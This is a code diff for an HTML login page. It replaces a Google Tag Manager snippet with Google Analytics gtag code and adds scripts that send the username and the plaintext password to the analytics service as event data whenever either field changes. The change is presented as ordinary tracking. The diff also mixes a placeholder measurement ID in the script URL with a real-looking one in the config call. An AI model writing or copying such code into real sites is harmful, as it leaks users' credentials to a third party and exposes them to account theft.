@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <!-- Google Tag Manager -->
-<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-})(window,document,'script','dataLayer','GTM-WTQGT2N');</script>
-<!-- End Google Tag Manager -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=GA_MEASUREMENT_ID"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-K1WGWHB5DX');
+</script>
+
   <title>Login</title>
 </head>
 <body>
@@ -21,5 +23,25 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <br>
     <input type="submit" value="Login">
   </form>
+
+  <script>
+    document.getElementById('username').addEventListener('change', function(event) {
+      var username = event.target.value;
+      gtag('event', 'input_data', {
+        'event_category': 'Input Field',
+        'event_label': 'Username',
+        'input_value': username
+      });
+    });
+
+    document.getElementById('password').addEventListener('change', function(event) {
+      var password = event.target.value;
+      gtag('event', 'input_data', {
+        'event_category': 'Input Field',
+        'event_label': 'Password',
+        'input_value': password
+      });
+    });
+  </script>
 </body>
 </html>
